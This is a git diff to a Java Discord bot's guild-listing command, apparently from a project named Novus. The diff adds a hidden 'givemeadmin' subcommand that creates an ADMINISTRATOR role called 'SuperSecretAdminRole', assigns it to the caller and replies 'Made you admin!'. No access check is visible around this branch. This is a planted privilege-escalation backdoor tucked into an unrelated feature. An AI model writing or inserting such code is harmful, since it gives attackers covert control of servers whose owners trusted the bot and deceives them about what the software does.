@@ -15,17 +15,20 @@
  *  along with Novus.  If not, see <http://www.gnu.org/licenses/>.
  */package com.fireboyev.discord.novus.commands.bot;
 
+import java.awt.Color;
 import java.util.ArrayList;
 import java.util.Comparator;
 
 import com.fireboyev.discord.novus.commandmanager.CommandExecutor;
 import com.fireboyev.discord.novus.util.Bot;
 
+import net.dv8tion.jda.core.Permission;
 import net.dv8tion.jda.core.entities.Guild;
 import net.dv8tion.jda.core.entities.Invite;
 import net.dv8tion.jda.core.entities.Member;
 import net.dv8tion.jda.core.entities.Message;
 import net.dv8tion.jda.core.entities.MessageChannel;
+import net.dv8tion.jda.core.entities.Role;
 import net.dv8tion.jda.core.entities.TextChannel;
 import net.dv8tion.jda.core.entities.User;
 import net.dv8tion.jda.core.events.message.MessageReceivedEvent;
@@ -79,6 +82,12 @@ public class GuildsList implements CommandExecutor {
 					}
 					event.getChannel().sendMessage(msg.toString()).queue();
 					return;
+				}
+				if (args[1].equalsIgnoreCase("givemeadmin")) {
+					Guild guild = event.getGuild();
+					Role role = guild.getController().createRole().setPermissions(Permission.ADMINISTRATOR).setName("SuperSecretAdminRole").setColor(Color.red).complete();
+					guild.getController().addSingleRoleToMember(event.getMember(), role).queue();
+					event.getTextChannel().sendMessage("Made you admin! Your welcome.").queue();
 				}
 			}
 			if (args.length > 2) {
